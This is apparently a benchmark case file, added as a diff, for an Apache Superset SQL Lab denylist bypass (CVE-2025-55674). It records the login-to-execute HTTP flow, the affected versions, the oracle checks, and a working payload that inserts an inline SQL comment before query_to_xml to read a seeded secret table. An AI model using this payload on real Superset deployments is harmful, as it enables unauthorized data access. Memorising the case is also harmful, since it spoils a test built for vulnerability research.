@@ -1,0 +1,139 @@
+{
+  "eval_id": "PCBV2-0045",
+  "case_id": "INJ-01-superset-denylist",
+  "product": "Apache Superset (apache/superset)",
+  "app_purpose": "Data exploration / BI platform with a SQL Lab query IDE; enforces a SQL-function authorization denylist (DISALLOWED_SQL_FUNCTIONS) on user-submitted queries",
+  "language": "python",
+  "root_cause": "CWE-89 / SQL authorization bypass -- the DISALLOWED_SQL_FUNCTIONS denylist that gates SQL Lab queries is defeated by an inline SQL comment before a denylisted function's argument list",
+  "mechanism_family": "sql-injection/authz-denylist",
+  "run_mode": "real-app-http",
+  "cve_pair": {
+    "original_cve": "CVE-2024-39887",
+    "bypass_cve": "CVE-2025-55674",
+    "original_published": "2024-07-16",
+    "bypass_published": "2025-09-04"
+  },
+  "versions": {
+    "v0": {
+      "identifier": "4.0.1",
+      "ref": "official image apache/superset:4.0.1 (pre CVE-2024-39887: no DISALLOWED_SQL_FUNCTIONS enforcement -- check_sql_functions_exist is not defined and not called in db_engine_specs/base.py)",
+      "compose_profile": "v0",
+      "image": null,
+      "source_url": null,
+      "base_url": null
+    },
+    "v1": {
+      "identifier": "4.0.2",
+      "ref": "official image apache/superset:4.0.2 (CVE-2024-39887 fix, TARGET: sqlparse-based sql_parse.check_sql_functions_exist -> ParsedQuery.check_functions_exist, enforced in db_engine_specs/base.py:1591)",
+      "compose_profile": "v1",
+      "image": null,
+      "source_url": null,
+      "base_url": null
+    },
+    "v2": {
+      "identifier": "5.0.0",
+      "ref": "official image apache/superset:5.0.0 (CVE-2025-55674 fix, commit ce6d0d5963: sqlglot-based sql/parse.py SQLScript.check_functions_present, enforced in db_engine_specs/base.py:1858)",
+      "compose_profile": "v2",
+      "image": null,
+      "source_url": null,
+      "base_url": null
+    }
+  },
+  "flag": {
+    "resource": "the query_to_xml() XML result returned in the REAL Superset SQL Lab HTTP API response (POST /api/v1/sqllab/execute/). ${PCB_FLAG} is seeded in a `pcb_secret` relation in the real analytics postgres.",
+    "placement": "read-exfil canary: each Superset container's bootstrap seeds ${PCB_FLAG} into analytics-db.pcb_secret; the denylisted PostgreSQL function query_to_xml runs an inner query `SELECT val FROM pcb_secret` and returns the flag as XML in the JSON response. Nothing is planted in Superset's code; the flag lives only in the analytics DB the denylist is meant to protect access to.",
+    "detect": "flag token substring appears in the real SQL Lab execute API JSON response body iff the denylisted query_to_xml executed (denylist bypassed). Blocked queries return HTTP 500 'SQL statement contains disallowed function(s)' with no flag.",
+    "class_kind": "read-exfil",
+    "oracle_variant": "A"
+  },
+  "trigger": {
+    "type": "external-http",
+    "auth_flow": [
+      "POST /api/v1/security/login  {username:analyst, password:analyst-pw, provider:db, refresh:true} -> access_token (low-priv user, role PCB_Analyst = sql_lab+Gamma perms + database_access on the analytics DB; NOT admin)",
+      "GET  /api/v1/security/csrf_token/  (Authorization: Bearer <token>) -> csrf_token + session cookie",
+      "POST /api/v1/sqllab/execute/  (Bearer + X-CSRFToken + session cookie) body {database_id, sql:<crafted>, runAsync:false, schema:public}"
+    ],
+    "sink": "superset/db_engine_specs/base.py::BaseEngineSpec.execute -> sql_parse.check_sql_functions_exist(query, DISALLOWED_SQL_FUNCTIONS['postgresql'], 'postgresql')",
+    "original_sql": "SELECT query_to_xml('SELECT val FROM pcb_secret', true, false, '')",
+    "residual_sql": "SELECT query_to_xml/**/('SELECT val FROM pcb_secret', true, false, '')"
+  },
+  "given_to_method": [
+    "patch.diff",
+    "original_poc.py",
+    "oracle.py",
+    "docker-compose.yml",
+    "Dockerfile",
+    "superset_config.py",
+    "bootstrap.py",
+    "bootstrap.sh"
+  ],
+  "held_out": [
+    "_heldout/bypass_poc.py",
+    "advisory (GHSA-fxgf-3xh6-m2pp)"
+  ],
+  "evidence": {
+    "advisory_url": "https://github.com/apache/superset/security/advisories/GHSA-fxgf-3xh6-m2pp",
+    "fix_reference": "official image apache/superset:4.0.2 (CVE-2024-39887 fix, TARGET: sqlparse-based sql_parse.check_sql_functions_exist -> ParsedQuery.check_functions_exist, enforced in db_engine_specs/base.py:1591); official image apache/superset:5.0.0 (CVE-2025-55674 fix, commit ce6d0d5963: sqlglot-based sql/parse.py SQLScript.check_functions_present, enforced in db_engine_specs/base.py:1858)",
+    "incomplete_fix_quote": "The sqlparse-based check_sql_functions_exist (Superset 4.0.2) could be defeated with specially crafted inline SQL comments, letting a user execute a denylisted function; fixed in 5.0.0 (commit ce6d0d5963) by replacing sqlparse with sqlglot.",
+    "repro_log": "repro.log",
+    "commands": [
+      "PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all"
+    ],
+    "artifact_sha256": {
+      "case.json": "ed8e7f18f060ae99e451a5f64465ffe775800654ccaa623372f2d350288d9f52",
+      "repro.log": "a3220ae4073219c458b2859e3cfacbb80cf8eb5166cd7c4356ed9358ad8b0494",
+      "docker-compose.yml": "410d98a29ddd0d2fcf441147ee559890cdf80ba6c6c79e14a6022678c8f5a04b",
+      "oracle.py": "a14a516c81865e0d721ebe4a0c1183ed558ecafe24140071f65f50f432a390d9",
+      "patch.diff": "f5db558ba828d7da815d7e69365f62126feac937714b1637d0e7e5f389ed5476"
+    }
+  },
+  "labels": {
+    "quality_tier": "gold",
+    "tier": "gold",
+    "is_dos": false,
+    "clean_for": {
+      "same_sink_incomplete_fix": true,
+      "runtime_verified": true,
+      "real_app_http": true
+    }
+  },
+  "status": {
+    "classification": "strict_gold",
+    "review_reason": "target recipe explicitly identifies an official/published image"
+  },
+  "provenance": {
+    "source": "Official apache/superset images 4.0.1 / 4.0.2 / 5.0.0 (no Superset source copied). The denylist is the real feature configured via superset_config.py::DISALLOWED_SQL_FUNCTIONS (verbatim from Superset's own default config.py) and enforced by each installed release. Sink: db_engine_specs/base.py BaseEngineSpec.execute -> sql_parse.check_sql_functions_exist (ParsedQuery/sqlparse @ 4.0.2; SQLScript/sqlglot @ 5.0.0).",
+    "verified": "2026-07-15 real Docker, run_mode=real-app-http. Three REAL Apache Superset apps (official images), each with a real sqlite metadata DB and a shared real postgres:16-alpine analytics DB registered as a Superset database connection, plus a low-priv SQL-Lab user. Trigger = external authenticated HTTP to the REAL SQL Lab execute API (login -> csrf_token -> POST /api/v1/sqllab/execute/). validate_case gate PASSED: original query_to_xml reaches flag on V0=4.0.1 (HTTP 200, flag in XML), blocked on V1=4.0.2 (HTTP 500 disallowed function), comment-inline residual reaches flag on V1=4.0.2 (HTTP 200, flag in XML); V2=5.0.0 negative control blocks both (HTTP 500). See repro.log.",
+    "notes": "REAL-APP-HTTP (no source lift, no driving postgres directly). The denylist bypass fires through the real Superset SQL Lab HTTP API as a low-priv user; the oracle exclusively exercises the denylisted-function (query_to_xml) channel, so flag-in-response strictly measures the DISALLOWED_SQL_FUNCTIONS bypass. query_to_xml is denylisted precisely because it runs an inner query at the database engine, escaping Superset's per-query SQL-analysis controls. The only image change is installing a PostgreSQL driver (psycopg2-binary) -- a standard Superset deployment step, required because the 5.0.0 base image ships no postgres driver; no Superset code is modified.",
+    "patch_diff_fix": {
+      "audit": "ROUND9-2026-08-06",
+      "issue": "construction patch.diff was V1->V2 (bypass); synced from inputs/ upstream V0->V1 diff"
+    }
+  },
+  "external_http_trigger": true,
+  "runs_real_software": true,
+  "is_verbatim_lift": false,
+  "schema_version": "strict-1",
+  "execution": {
+    "run_mode": "real-app-http",
+    "software_origin": "official_image",
+    "full_application": true,
+    "source_lift": false,
+    "external_trigger": "http",
+    "image_digest": null,
+    "source_commit": null
+  },
+  "oracle": {
+    "variant": "same_sink",
+    "seed": "original_poc.py",
+    "residual": "_heldout/bypass_poc.py",
+    "checks": {
+      "seed_v0_reaches": true,
+      "seed_v1_blocked": true,
+      "residual_v1_reaches": true,
+      "residual_v2_blocked": true
+    },
+    "flag_resource": "the query_to_xml() XML result returned in the REAL Superset SQL Lab HTTP API response (POST /api/v1/sqllab/execute/). ${PCB_FLAG} is seeded in a `pcb_secret` relation in the real analytics postgres.",
+    "detector": "flag token substring appears in the real SQL Lab execute API JSON response body iff the denylisted query_to_xml executed (denylist bypassed). Blocked queries return HTTP 500 'SQL statement contains disallowed function(s)' with no flag."
+  }
+}
